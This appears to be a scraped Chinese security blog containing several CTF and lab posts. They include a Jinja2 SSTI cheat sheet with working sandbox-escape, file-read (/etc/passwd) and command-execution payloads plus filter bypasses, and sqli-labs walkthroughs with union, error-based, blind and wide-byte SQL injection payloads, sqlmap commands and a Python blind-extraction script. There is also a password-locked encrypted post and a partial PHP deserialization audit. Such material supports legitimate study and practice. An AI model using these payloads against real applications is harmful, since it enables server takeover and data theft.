12345print(&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__)print(&quot;&quot;.__class__.__bases__[0].__subclasses__()[1].__init__)输出：&lt;function BlueprintSetupState.__init__ at 0x038CE0C0&gt;&lt;slot wrapper '__init__' of 'weakref' objects&gt; 查看其引用builtinsPython 程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于 builtins 却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块。 1&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__['__builtins__'] 这里会返回 dict 类型，寻找 keys 中可用函数，直接调用即可，使用 keys 中的 open （python2中是file）以实现读取文件的功能： 1&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__['__builtins__']['open']('D:\\\\test.txt').read() 读写文件在python2中使用file读写文件： 1234#读文件：&quot;&quot;.__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()#写文件：&quot;&quot;.__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test') 在python3中file没有了，使用open： 12#读文件：&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__['__builtins__']['open']('D:\\\\test.txt').read() 命令执行1.popen使用popen进行命令执行。首先要先找到os._wrap_close类，查看 os._wrap_close 方法的位置： 123&gt;&gt;&gt; import os&gt;&gt;&gt; ''.__class__.__mro__[1].__subclasses__().index(os._wrap_close)132 返回了下标索引，直接调用它 1&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls').read() 2.eval使用eval进行命令执行。 1&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()') 3.warnings.catch_warnings利用warnings.catch_warnings 进行命令执行。这个在python2和python3中有些不同，先说Python2的： 1[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami') 然后是Python3的： 1().__class__.__bases__[0].__subclasses__()[139].__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('whoami').read()&quot;) 或者也可以这样多行执行： 1234567891011{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__(&quot;os&quot;).popen(&quot;id&quot;).read()') }} {% endif %} {% endif %} {% endfor %}{% endif %}{% endfor %} 4.subprocess这个模块原本在python2中是commands，在python中被替换为subprocess。 1{}.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__['__builtins__']['__import__']('subprocess').getstatusoutput('ls') 1{}.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__['__builtins__']['__import__']('os').system('ls') 1{}.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read() Bypass现在很多模板注入都有限制，比如限制输入某些关键字，或者干脆直接限制输入某些字符。下面总结了一些绕过的方法。 过滤[]使用getitem()或者pop()绕过，如：&quot;&quot;.__class__.__bases__[0]绕过后：&quot;&quot;.__class__.__bases__.getitem(0) 读文件： 1&quot;&quot;.__class__.__base__.__subclasses__().pop(-1).__init__.__globals__.pop('__builtins__').pop('open')('test.txt').read() 执行命令： 1''.__class__.__base__.__subclasses__().pop(132).__init__.__globals__.pop('popen')('ls').read() 过滤引号request.args 是 flask 中的一个属性，为返回请求的参数，这里把popen和cmd当作变量名，将值传进来，进而绕过了引号的过滤。 1{{().__class__.__base__.__subclasses__().pop(117).__init__.__globals__[request.args.popen](request.args.cmd).read()}}&amp;popen=popen&amp;cmd=whoami 过滤下划线也是动态传参绕过 1{{&quot;&quot;[request.args.class][request.args.base][request.args.subclasses]()[117][request.args.init][request.args.globals][request.args.popen](request.args.cmd).read()}}&amp;class=__class__&amp;base=__base__&amp;subclasses=__subclasses__&amp;init=__init__&amp;globals=__globals__&amp;popen=popen&amp;cmd=cat /flag 过滤关键字比如过滤掉subclasses： 使用request.args动态传参绕过比如过滤掉subclasses： 123&quot;&quot;.__class__.__bases__[0][request.args.a]()[117].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()')}}&amp;a=__subclasses__# cookie传值&quot;&quot;.__class__.__bases__[0][request.cookies['var']]()[117].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()') 使用base64编码绕过1234# 编码前().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__.__builtins__['eval'](&quot;__import__('os').popen('ls').read()&quot;)# 编码后().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')](&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&quot;.decode('base64')) 使用字符串拼接绕过使用加号来拼接字符串， = 。 1&quot;&quot;.__class__.__base__['__subcl'+'asses__']()[117].__init__.__globals__['popen']('ls').read() 使用join连接字符串， 1[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[117].__init__.__globals__['popen']('ls').read() 过滤点号jinja2模板中有很多有用的内置过滤器，这里使用的是attr和join这两个过滤器。 1```{{request|attr([&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2]|join)}}```就相当于```{{request.__class__}} 还有关于过滤的方式： https://github.red/cybrics-2020-web-writeup/ 使用工具Tplmap 服务器端模板注入和代码注入检测与开发工具 一个 python 工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用 SSTI 来访问目标文件或操作系统。一些受支持的模板引擎包括 PHP、Ruby、JaveScript、Python、ERB、Jinja2 和 Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。","link":"/2020/07/25/ssti-1/"},{"title":"一些笔记","text":"嗨，请准确无误地输入密码查看哟！ ac35f2c000104d088ee9b190cb55c736f330c7f9287743812be4a5c33d5d3cb5cb7a257ee208658dca04b55eb86e690957aa664a95c8a9a91aa058987fe8fab712698d6cf1133424f55889e5e201f56f205a81a4a4ee10652f3560e69342c146cb8d9a2aac37254cd7843dbd30bbc3648a498c2506f7e8de148c6ca8a36697b9f3abbe24fbed0526b71c497e9e684fd9f98795d463926c1d906b01c54ce0b6c8e2384403477c5594fb6b87497509f10db2c4bec776d7dd0db931f1c5153be5a49b13179cf53134b8fa27a52d10e2fb66de32e0f032db258565e685d05dbf1de88dea8a6d0ce9c7f3f1457092cf0c9802b7376df1f9a20739e98630d86c8842e3d0a550e549abe09cee4b28348ced314b5664fcd0449b781e2d9eb21cf5b56b88c7cb702bf8ce869050bab30d2ab0e38810b07130a2416d5330aeac9d886ff87adc02da0d01acbe3f7ff383bb9e9d0770315be9e0dcaf12218dbfdaa85a6f3385fe3faaa058496e7ec503c979b6566447e639942017271a2bc1a87d9c411b11b0d3d1d50f96f7b97b46f822ca5a7fdfaf82ede4b5a58b1592724d7ca0c37fdc6376b3714c99bdd9b42913a7f3e379677b700527934534c47f22e48543e0e49c1ca92ff5c8c5c8c8078dae66c418581bee1621b61f81c6125d8d2b99fd798ebfc8f670b7de25519a8b60d7c98c99120f762cd08f56c8808c340f8b982e8dacffdb601f43901a3270a0adf74c26a011b00b96b9413f18fb41e0b91c17a6a9ae385035276f3fb791091f3a59f81cab8f4e06b25f04bcd32df871f52ea7fecdcb7e20207d555b5494cf368af16c8b380d457968b1c980c9d57ba629e494cdf5fe5502dca474798dc6aba9a4645b5ccbe1c910f7e2196ae7f700706a0f1e76806646995af0939da9a7f9c342a8a1534d0f2c806db23e638da33f1810f6a73d907d97d0ff2b4a6bfb1291860cc435c309049d67ec024123e590af006443d74ae0ec4adbdcdfaf5c3abd3ce3f1cc3b384ad39a6286ae7537d3a49341d3557f076c2088edf73b0e434cbc9f2870802d263b76d3351b7d31201dd6f59e482b9a83236909b945d0eb4d6b1446ceb23273048c0b11fcb0dfc28938c56a6f9198f2caf1a89d66340c5007c950a50cc8846dc83a577ca4542b0a3c5f698739492532a051d2b9510c202a2a56ad71e76313e46bdb8cd6e1252c697ca2dfa4816f9705b2b29cd00aad5c9261735fbe903f3e7744362e969816d6760540a6b3406875de5f33f1de3e3aa44168c38da5e1dfe341bb5e9cef1b20fb507c3942692ca8b211b82646534966d81de21041f50f164cb95424c44b69245775268ff0e68b4f11fce619a57a690aa87be6c4eea1188e155c85aec6bf6f442190487e05fe2cc4f1179a1b5f455f5b6fccd1bbf748d51e5f1c48d088e2f234eeda806d9efe70ad006096a07a3e3b8c7fe25e73de5db1a7c675e915abadfcd1bf42967207af322af946cbde2602641372edab947da0393920b38956c40ffca2601fecee5279ac4a768c1ccab31e97a4dad5f80fa5d54e466ca2b93a50665990f0ab2ea3117605b90f82775762a95c26c9c5ef0d4ce1c753b77a8930bd73eaf89b8fa1d8aadf8626ca539493f0533c1618d85459fb2635a3a328c88b1b1006dac5477d3d20b91b775a148923a18273b30690ea64fb2bc65350ea3dde443da9cbe2dc3355d6a7adad0d0397900f93076d01cb469b05549d1a897f9f5336c7ca70364625b6f883a61a42853c1bca29b5887d442472aa17ee6c0e1c0b720e491f49d6dd3e02a82108e7f9eae6b920e7a91a73fe7ecbb779f8013e1eaeea45c5f4ed4a98d16780b776ad4288b2400b286850e659aef3c8c520e3a134d8f6cb3a9e5508c75ee30ca2d988a727a419ddb6fc379aab440f4da66e88f26e3514a6f9c8eeed951eb1641ef1ebe8e3da31b4bfd1e6554ee8a722fc447dbb7b0cb6ef50c2fb42bad5c69d919079cc4ad0768def9edcc19f0fd2b7fa4b6706596bfa174102127ac57f5810bea0c149db84292bc9927dd38ecc6c65d5256261fe8d7f46fa4906f81c0fb4fe93278188e9e5e60f7419e9385780628fc5cabeb8cc4076e43130ce0d5caf8618d02fc056f54d2c824a4b513a5321995f40ef11242ea632d96d4474e83536f7d5c48324e102ba43c5c5e86195f1567dec675b6295318088d33e6eca253b1801da237c1e60e70d52761b41b60ab0f431ae93726d166c191c1cdae5841c393d624f63cb2751218232872a37544655d09ae548da51a455ea466799bee27077051537952da1898ef65cb39bc1964d8d941dedbf038ee54cd2ed4b6884edd19aec85b8c7ab1ed669389a905d80191e7ba5c7acfe9e8d03c59fddcf3cddd98fb36f077e99a5dab3975d024050b5143ab5f43a22663e6ffe1d409ae0235e07329404a1ed0d780d789f0b9a158dbb7fc077b94c64d30e233678c45a522ee574b4a81131a58b5e8d746a6600b3af0450fee593b686a6cb2dbc4a69043f48de764264b8ade4bf39f8ca750c0828b12e31844678132a76859264ef63aaabda45755c846605e9f003ff1ffa1dbb4314e6cd3c9bca238820e1fdc7d122a62829af91284ffa896cfca9e66635ac93df3bf6d1be64a6be510a5ff358709fa93b13fb286a6ce8abade23997dc57cc576a5126646ef9a9cec0ecc67ebb1052ffdae05c77c5498474e018703d5c3766cc6c231be2b714cdf74dfe32e66f3f267784d77a17b31b13311fa9b384fa9699b56a428d640c9b6ce3493046fc2c20255eda0153287e1f39841b5349fef1dc043e31ef66a31e85193f890f1ae75c801c620c84e77c5136445cff0b299477ef383f63b05da9ae014828fa9aaf8d752685eeb6307bc81302548d7a78ad0e0cead4e088fdafa2ae879a112d93d61b996d6b962854b7fcf359da3d7889a189abadce51f196499bb3c966665b75da2d4da0ecb30b1fcb602f654b4fe6d87f23e6bb6f307006502bc42509e39d6f533ff294b87deca312e47e5d7653cbc791b90a6b580d36463c8846be850ef28197f8bc4b37238cdc3edda34ef21c8f07e99aea23bbc983204277bf8db89fbbb77ba9a974a07656066f16d41151a4968bec9cae59daf59be941c140604b2d815c3670f64cc8f422b4609e24ea2173b27921ff81db0c4eccebdfacd2e5b4f110fd1ec849b0de370b61cd94cdd48354afd3bf7f6fe595b03852b691bb11dc91c6f290f9cba6f2a9bc11186a8e1e47ffa10dc94e0006075a6c14d0d2ecb61ca28b58cb94896e61f8f785c33eee658739e211acef1dd9e403d07ee769b1d16354c17b6e1a45fe6f8abecd29cdf90a12759c0fb1ee258b09b3c6189b8b3f2caa833e40c087038c05a8389a3eed5104eaab677df9e0510c8504b9659794bbc4ae15ec9cd5c382057823c3cd95798d21698d2434b27eabc02289c7eff9d97e6ceb80010bb19544b1481613f9e29cd8129ad4f7d1bc8f0625d9a810f9d6ed5403e3d19da24f7863df0550ac9de376f6ada631e9018874590e1e57da221cac10dcab5a44bd94921bf5cb9639c65dd3f2fae38db87cd3ee84b8af9eb500d6caf7ef33c1e97e0b807101ac82e84b644c694a406c8efbf526e5572660275a159b8c006f4efd8551351a1b3b8b726cbacb7b07ed0efd145df1d5428425287cb42d102c5d9f7bdb98a36528cc2ed112b1bdca94385d154ea23de4a358709a92406e983e4776d8642c18c473ffd6b90cc33f3ac4f24f8cd6b0359d50edae6b883d7040249bc7fc5174b6bab1b49ef47110374913bd7e5a0fbc89a655719960fa2534625316f9591d0fad2fc2b4e8f1442543d94e557fd515ea82fbd3b39090df3ac58d3283621847fd397d2441b4a762ea5eb81a5b0df6c434b6e20e610e7855d084b29961b46987669ddbaccb5d652afb39dff59fc5e7211d2e1ca43337c7eaace6053e3baba1472cee6d567b40ff938b7746b094d4f48ca27e731f5205aa668008e4c021faaffc97ba2b1b7e1c9d635684f21531351da863783031e58d2316b05000251e37f9bfee053972bf4f7a59917d0eacecfa84dca0730442fbd22e583f0aefb4036fd607227f50e0e0a7a8620868f339af360fcda117b3b1e21068b81b5cd028680297899bc2d32baf8b8722e3f3cfa15e7cd02662c78c20d7dc2b2274a0faba742e4abf2974429fcbb8bf6f5c9caee6d6e495d54a0f2f3489d7ef9ab94f510c3c0e5b82dfa1b4b76b6725e6cd6166eb05194eaf112942c8da94c31986b04f88907e80da6a132260f89a192382c7c10b3aedd13ebc06476917b9cc42080ff471a7660ed3b2d571ef06ba1c0f8e2abef5b4f319f7d206e77794a8da4170b11df5e78bce0097d22cdedfa2747e75f5a0e3d3af49bff24c3c8d40a073a0f1d49ec431615eb71259b875d15879a0dcad8be96ffb37be00d9ea58b78e1a9428fbe1cb7710e21abaf7088a25112549079ec656023525e0b9e8561d7936fc2a80a8d746108a208f27b11115db8598fd0217b667aa9dd4b416d91d289fdff93bd0491c5aaeb0ed27f6a3228715130d84354997a798b0a69787036d74b8d2680ff8e67749632031f9b9259285768bec27a89cc8d3ac1b6f7b61b34ebc0d15aa9042b4f1d87e50c98a0f5ce3ff9eae0c37ffffb20841d8b14ead005eb3b31842cce93ec32d9d1ac8ba877d1c5f3e3da22589dde390d9c348771e45c9c00fbeaa782bf4040aa07019d23b8ba382e20e59180a0a3768e21e9472c27fce9f52c45e54ea8ee3ca9e00b17a30e884f3381d22593663797ab26945729f2bd657987e6c99a77c9c929962f4abd5c85c2b5a8af95cc5f7872771ad56d8112202eee4c44a2d280800761887587f03496a3bf19afafa08c73b9ca5cbf68786c0af43bd21748a9a4db933214dc0d923ee080485c89ba53e2bad5348b00d1e696b960c7093bdb38c41cf2bcf5106e208d9b31d1611e4e470cffe6fcf3fe5a8d43e1c2024b69f565c7ae15912c80ec1560680d18e29b3fbb51ecde28063bcd072a8ccb87f6ca80f510f2be9a25ab015c4c85c312f6989e07e6432984e8c883407cc96c3b751e3b0a83a0c7943b6cf5957b0a2ff1a173948853b71f221930d513cb5d2d362e132274700c1aa8f4fde8b159d8f9c89ab003ba267884195e06230710d01f028eca1ff9df1b1fbee9a8414bb00f20d2436d499be232c011bd8081f3a4860a6788eeff1ab11085b7c86a35d59ff108f4f48bd6bf69454bc9e0bec1e24132d1da8d1755323384c95e1ba9e02e11ee8a34c2e89ac4fb40d22a2982fb2c5e092b8037acb780b5bf7f45674ad055acaa35538a7c2eac3add55a995316ba37fbb651668ff8a7884d97dc6f828ad0399adbcf8895170fad4f745521ebd3c427794b7d8547cbbaaad96fdff9e61767f8380894f956dcd740832d9e8c2133b2fda048940e8a03b3aa7c744e948a1168cfb3178e7e8320019738561859d1312fa415abe2da5f360f96f5131250dbf7426deacff5cc15c28be2572d977d5cc6ca5222fb5f9e1169c63eed98fd545a4b42e5d3b124441dc41f303b9e0020f358e6afc07c79d0fcbe319660554564b7f05c0aa127b16cd6967b0510bd44e0b8243646b3c6d94ab374e0a85d4061a36a18911f9f5a09a9d6ff07e7827aa768f6bad40fe1f6d907819e1808f8489afa65e670d62a5b2c3eeebec89de097ed902148bd715a5076e63c5c474ac85e97fd74d112079de70199f14f1a2552328e4216e141bcf588bd3ea48d0964661096eb16d25cb24c80b1782a72b65ea1ca28753cc61f0495f423f674b56098f096fafd679de869869ccee4630cac4c6b6f88b1ed1514b287ca117f9a27acef554af0498d870dd12d387ee6b018771dbcbd054137a5e462d48da24979bd5f07b842c5d506fe343e9623360a33d2e177aa7c358cbb0dd2c5fcb733073bda5183d2d501b618d985b5f56c13e377dbb97b","link":"/2020/07/31/links/"},{"title":"sqli_labs通关记录（一）","text":"[TOC]早就想刷sqli_labs了，这几天正好没事干，学习一下sql注入，顺便熟悉一下sqlmap练习平台：https://buuoj.cn/challenges#sqli-labs Page-1(Basic Challenges)less-1使用联合注入输入id=1',出现报错信息。输入id=1'%23，页面恢复正常。测试联合查询，发现有三段： 1id=-1'union select 1,2,3%23 查询数据库名： 1id=-1'union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23 查询表： 1id=-1'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctftraining'),3%23 查询列名： 1id=-1'union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='ctftraining'),3%23 查询字段： 1id=-1'union select 1,(select group_concat(flag) from ctftraining.flag),3%23 使用报错注入使用updatexml函数： 12345678#查询数据库：id=1'||updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1)%23#查询表：?id=1'||updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='ctftraining'),0x7e),1)%23查列名：id=1'||updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='ctftraining'),0x7e),1)%23查字段：id=1'||updatexml(1,concat(0x7e,(select group_concat(flag) from ctftraining.flag),0x7e),1)%23 使用sqlmap参数说明： 123456789101112-u 指定url--batch 永远不要要求用户输入，使用默认行为--method 指定请求方法(e.g. GET,POST)--dbs 列出数据库名-D 指定数据库--tables 列出表名-T 指定表名--columns 列出列名-C 指定列名--dump Dump DBMS数据库表的条目--dump-all Dump 所有DBMS数据库表的条目--current-db 查询当前数据库 查数据库： 1sqlmap -u &quot;http://19d74227-be91-4963-9efb-1187a8c78bda.node3.buuoj.cn/Less-1/?id=1&quot; --batch --method=GET --dbs 查询表： 1sqlmap -u &quot;http://19d74227-be91-4963-9efb-1187a8c78bda.node3.buuoj.cn/Less-1/?id=1&quot; --batch --method=GET -D ctftraining --tables 查列名： 1qlmap -u &quot;http://19d74227-be91-4963-9efb-1187a8c78bda.node3.buuoj.cn/Less-1/?id=1&quot; --batch --method=GET -D ctftraining -T flag --columns 查字段： 1sqlmap -u &quot;http://19d74227-be91-4963-9efb-1187a8c78bda.node3.buuoj.cn/Less-1/?id=1&quot; --batch --method=GET -D ctftraining -T flag -C &quot;flag&quot; --dump less-2和less-1一样，不用加单引号： 1id=0 union select 1,(select flag from ctftraining.flag),3%23 less-3less-1基础上加个括号： 1id=0') union select 1,(select flag from ctftraining.flag),3%23 less-4把less-3单引号改为双引号： 1id=0&quot;) union select 1,(select flag from ctftraining.flag),3%23 less-5没有显示位了，输入单引号有报错信息，联合注入用不了了，使用报错注入，使用extractvalue函数，extractvalue和updatexml的不同是：extractvalue需要两个参数，而updatexml是需要三个参数。 1id=1'^(extractvalue(1,concat(0x7e,(database()),0x7e)))%23 less-6使用报错注入，把less-5中的单引号改为双引号， 1id=1&quot;^(extractvalue(1,concat(0x7e,(database()),0x7e)))%23 less-7这个上面写的是使用into ouutfile，但我太菜了，用布尔盲注做出来的： 1?id=1') and 1=1 and ('1'='1 less-8time-based blind: 12id=1'and (select 1 from (select(sleep(5-(if((length(database())&gt;0),0,5)))))x)%23id=1'and (select 5697 from (select(sleep(3-(if(ord(mid((select distinct(ifnull(cast(schema_name as nchar),0x20)) from information_schema.schemata limit 0,1),1,1))&gt;96,0,3)))))a) and '1'='1 less-9time-based blind: 1234567891011121314151617181920212223242526272829303132333435363738394041424344import requestsdef db_names(): db_name_list = [] #db_num = db_nums() for n in range(int(db_num)): db_name = &quot;&quot; i =0 while(True): i = i + 1 low = 32 high = 127 while(low &lt; high): mid = (low + high) &gt;&gt; 1 sql_url = &quot;http://a619f897-b4fe-43c3-801f-1f36f08010a0.node3.buuoj.cn/Less-9/&quot; payload = &quot;?id=1' and (select 1 from (select(sleep(3-(if(ord(mid((select distinct(ifnull(cast(schema_name as nchar), 0x20)) from information_schema.schemata limit {},1),{},1))&gt;{},0,3)))))x) and '1'='1&quot;.format(n,i,mid) print(payload[4:]) url = sql_url + payload try: r = requests.get(url=url,timeout=3) while(True): if r.status_code != 200: r = requests.get(url=url,timeout=3) else: break print(r.status_code,url.split(&quot;/&quot;)[-1]) high = mid except: low = mid + 1 if low != 32: db_name += chr(low) else: break db_name_list.append(db_name) print(&quot;retrieved:&quot;,db_name_list[n]) print(&quot;available databases [{}]:&quot;.format(db_num)) for i in db_name_list: print(&quot;[*]&quot;,i)if __name__ == &quot;__main__&quot;: db_names() less-10和less-9一样，单引号改成双引号 less-11报错注入，只显示部分字符使用trim截取掉已经出现的部分 from b)```，将字符串 B 中的 A 部分删去，返回剩余部分12345```查数据库：admin'||updatexml(1,concat(0x7e,trim(&quot;ctftraining,information_schema,&quot; from (select group_concat(schema_name) from information_schema.schemata)),0x7e),1)%23查数据：admin'||updatexml(1,concat(0x7e,trim('flag{a51ea1de-a683-4fb1-a9aa-95' from (select group_concat(flag) from ctftraining.flag)),0x7e),1)%23 less-1212xpsz&quot;) and (select 6059 from(select count(*),concat(0x7e,(select mid((ifnull(cast(schema_name as nchar),0x20)),1,54) from information_schema.schemata limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.plugins group by x)a) and (&quot;ygyp&quot;=&quot;ygyp less-13把less-12双引号改成单引号 less-14把less-12中的括号去掉 less-15time-based blind: 1admin' and (select 1 from (select(sleep(3-if(ord(mid((select flag from ctftraining.flag),1,1))&gt;102,0,3))))a) and '1'='1 less-16time-based blind: 1admin&quot;) and (select(sleep(3-if((ord(mid((select flag from ctftraining.flag),1,1)))&gt;100,0,3)))) and (&quot;1&quot;=&quot;1 less-17从查询语句变成插入语句，好像还是一样 1123' and updatexml(1,concat(0x7e,(select flag from ctftraining.flag),0x7e),1) and '1'='1 less-18user-agent头报错注入。 less-19referer注入 less-20cookie注入 less-21","link":"/2020/07/31/sqli-labs/"},{"title":"sqli_labs通关记录（二）","text":"[TOC] Page-2 (Adv Injections)less-23time-based blind: 12payload:?id=1'and if(ord(mid((select flag from ctftraining.flag),1,1))&gt;101,sleep(3),1) or ' less-24二次注入 less-2512```?id=1' anandd 1=1 anandd '1'='1 less-25aboolean-based blind 1?id=1 anandd ascii(mid((select flag from ctftraining.flag),1,1))&gt;103 %23 time-based blind 1?id=1 anandd if(length(database())&gt;1,sleep(3),1) %23 less-26报错注入，之前做过的原题，空格过滤用括号代替，or,and双写绕过。 1?id=1'^updatexml(1,concat(0x7e,(select(right(flag,30))from(ctftraining.flag)),0x7e),1)^'1'='1 less-26aBoolean-based blind,过滤情况和26一样 1id=1'^ascii(mid((select(flag)from(ctftraining.flag)),1,1))&gt;102^'1'='1 less-27过滤了空格，注释符，union,select 使用大小写绕过 1?id=0'%0aunIon%0aselEct%0a1,database(),3%0aor%0a'1'='1 less-27aselect```查询，和27一样12```?id=0&quot;%0auniOn%0aseLecT%0a1,database(),3%0aor%0a'1'=&quot;1 less-28Boolean-based blind 1?id=0'||ascii(mid((selECt%0aflag%0afrom%0actftraining.flag),1,1))&gt;102^'1'='0 union select 1?id=0%27)%0aunion%0aall%0aselect%0a1,(select%0aflag%0afrom%0actftraining.flag%0a%0alimit%0a0,1),3%0aor%0a(%271%27=%270 less-28aBoolean-based blind 1?id=0'^ ascii(mid((select group_concat(flag) from ctftraining.flag),1,1))&gt;102 or '1'='0 less-29time-based blind 1?id=1%27%20and%20(select(sleep(2-if(ord(mid((select flag from ctftraining.flag),1,1))&gt;102,0,2))))%20and%20%271%27=%271 less-30Boolean-based blind 1?id=1&quot;and ord(mid((select flag from ctftraining.flag),1,1))&gt;101 and &quot;1&quot;=&quot;1 less-311?id=1&quot;)and ord(mid((select flag from ctftraining.flag),1,1))&gt;101 and (&quot;1&quot;=&quot;1 less-32宽字节注入， 1?id=-1%df%27 union select 1,user(),3 -- + less-33宽字节 1?id=-1%df%27 union select 1,database(),3 -- + less-34宽字节 1uname=admin%df' union select 1,(select flag from ctftraining.flag)%23&amp;passwd=123&amp;submit=Submit less-351?id=-1 union select 1,database(),3 -- + less-36和33一样 less-37一样 less-38一样 总结几十道题都是一样的，没什么营养，掌握几个payload就可以一直用，也学不到什么东西，刷的我好累，休息一阵子再刷后面的吧。","link":"/2020/08/03/sqli-labs-2/"},{"title":"buu刷题记录（三）","text":"[TOC] [强网杯 2019]Upload 代码审计，反序列化 代码审计真的头疼，太难了。进入页面有个登陆框，注册登陆，有个上传页面，试了上传webshell无果，看cookie是一段编码，解码之后是序列化后的字符串，肯定就是反序列化了，扫后台发现www.tar.gz，下载下来，审计源码。 文件这么多，既然是反序列化，直接搜索反序列化的魔法函数，这样快一点，一般都是搜索__call和__destruct，然后在application/web/controller/Profile.php这个文件里发现了__call方法和__get__方法 call：当调用类中不可访问属性时，call将自动被调用。 get： 当调用类中不可访问对象时，get将自动被调用。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394# Profile.php&lt;?phpnamespace app\\web\\controller;use think\\Controller;class Profile extends Controller{ public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __construct() { $this-&gt;checker=new Index(); $this-&gt;upload_menu=md5($_SERVER['REMOTE_ADDR']); @chdir(&quot;../public/upload&quot;); if(!is_dir($this-&gt;upload_menu)){ @mkdir($this-&gt;upload_menu); } @chdir($this-&gt;upload_menu); } public function upload_img(){ if($this-&gt;checker){ if(!$this-&gt;checker-&gt;login_check()){ $curr_url=&quot;http://&quot;.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].&quot;/index&quot;; $this-&gt;redirect($curr_url,302); exit(); } } if(!empty($_FILES)){ $this-&gt;filename_tmp=$_FILES['upload_file']['tmp_name']; $this-&gt;filename=md5($_FILES['upload_file']['name']).&quot;.png&quot;; $this-&gt;ext_check(); } if($this-&gt;ext) { if(getimagesize($this-&gt;filename_tmp)) { @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;; $this-&gt;update_img(); }else{ $this-&gt;error('Forbidden type!', url('../index')); } }else{ $this-&gt;error('Unknow file type!', url('../index')); } } public function update_img(){ $user_info=db('user')-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile['ID'])-&gt;find(); if(empty($user_info['img']) &amp;&amp; $this-&gt;img){ if(db('user')-&gt;where('ID',$user_info['ID'])-&gt;data([&quot;img&quot;=&gt;addslashes($this-&gt;img)])-&gt;update()){ $this-&gt;update_cookie(); $this-&gt;success('Upload img successful!', url('../home')); }else{ $this-&gt;error('Upload file failed!', url('../index')); } } } public function update_cookie(){ $this-&gt;checker-&gt;profile['img']=$this-&gt;img; cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600); } public function ext_check(){ $ext_arr=explode(&quot;.&quot;,$this-&gt;filename); $this-&gt;ext=end($ext_arr); if($this-&gt;ext==&quot;png&quot;){ return 1; }else{ return 0; } } public function __get($name) { return $this-&gt;except[$name]; } public function __call($name, $arguments) { if($this-&gt;{$name}){ $this-&gt;{$this-&gt;{$name}}($arguments); } }} 这个类主要处理上传文件的逻辑，创建目录，重命名文件，修改后缀，上传文件。不管是什么文件都会修改成png格式的。但是只有这一个类也没法使用，再查找__destruct函数，在application/web/controller/Register.php文件中找到这个方法。关键代码如下：123456789101112131415161718# Register.php&lt;?phpclass Register extends Controller{ public $checker; public $registed; public function __construct() { $this-&gt;checker=new Index(); } public function __destruct() { if(!$this-&gt;registed){ $this-&gt;checker-&gt;index(); } }} 当对象被销毁时，调用__destruct方法，调用$this-&gt;checker对象的index()函数，而Profile类中是没有这个函数的，这样就可以成功触发__call方法，1234567891011public function __get($name){ return $this-&gt;except[$name];}public function __call($name, $arguments){ if($this-&gt;{$name}){ $this-&gt;{$this-&gt;{$name}}($arguments); }} 说一下这里call的两个参数，第一个参数$name会自动接收不存在的方法名，第二个$arguments则以数组的方式接收不存在方法的多个参数。在```destruct中调用$this-&gt;checker-&gt;index()，index就会变成__call的第一个参数传递进去，而index()中没有参数，__call中的第二个参数也就为空。 参数传递进去后，就变成在__call中调用 **$this-&gt;index()**，而这个类中是没有这个对象的，然后触发 **__get** 方法。 然后看application/web/controller/Index.php```文件，关键代码如下：1234567891011121314151617181920212223242526class Index extends Controller{ public $profile; public $profile_db; public function index() { if($this-&gt;login_check()){ $curr_url=&quot;http://&quot;.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].&quot;/home&quot;; $this-&gt;redirect($curr_url,302); exit(); } return $this-&gt;fetch(&quot;index&quot;); } public function login_check(){ $profile=cookie('user'); if(!empty($profile)){ $this-&gt;profile=unserialize(base64_decode($profile)); $this-&gt;profile_db=db('user')-&gt;where(&quot;ID&quot;,intval($this-&gt;profile['ID']))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null){ return 1; }else{ return 0; } } }} 